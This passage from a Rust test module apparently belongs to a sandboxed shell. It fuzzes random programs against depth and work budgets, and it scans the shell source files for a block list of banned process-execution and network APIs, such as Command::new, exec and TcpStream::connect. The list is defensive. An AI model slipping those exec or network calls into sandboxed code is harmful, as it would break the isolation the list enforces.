                nested(&mut rng)
            } else {
                program(&mut rng)
            };
            let work = match round % 3 {
                0 => 300,
                1 => 20_000,
                _ => BudgetLimits::standard().work_per_line,
            };
            check(&line, limits(work));
        }
    }

    #[test]
    fn random_programs_under_a_tiny_depth_cap_stay_within_it() {
        let mut rng = Rng(0xD1B5_4A32_D192_ED03);
        for _ in 0..600 {
            let line = if rng.below(2) == 0 {
                nested(&mut rng)
            } else {
                program(&mut rng)
            };
            check(
                &line,
                BudgetLimits {
                    max_depth: 3,
                    work_per_line: 50_000,
                    ..BudgetLimits::standard()
                },
            );
        }
    }

    #[test]
    fn the_never_exec_and_no_fetch_source_invariants_hold_across_the_shell_tree() {
        // The same substring scan `never_exec_static_check` runs, over every file of the shell
        // module, so a file added here is covered by name rather than by the crate-wide walk.
        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/shell");
        let mut scanned = 0;
        for entry in std::fs::read_dir(&dir).unwrap().flatten() {
            let path = entry.path();
            if path.extension().is_some_and(|e| e == "rs") {
                let text = std::fs::read_to_string(&path).unwrap();
                // Built by concatenation so this file does not trip its own scan.
                for banned in [
                    ["std::process", "::Command"].concat(),
                    ["process", "::Command"].concat(),
                    ["Command", "::new"].concat(),
                    ["libc::", "exec"].concat(),
                    ["nix::unistd::", "exec"].concat(),
                    ["std::", "net::Tcp"].concat(),
                    ["std::", "net::Udp"].concat(),
                    ["Tcp", "Stream::connect"].concat(),
                    ["req", "west"].concat(),
                ] {
                    assert!(
                        !text.contains(&banned),
                        "{} contains {banned}",
                        path.display()
                    );
                }
                scanned += 1;
            }
        }
        assert!(scanned >= 10, "only {scanned} shell files scanned");
    }
}
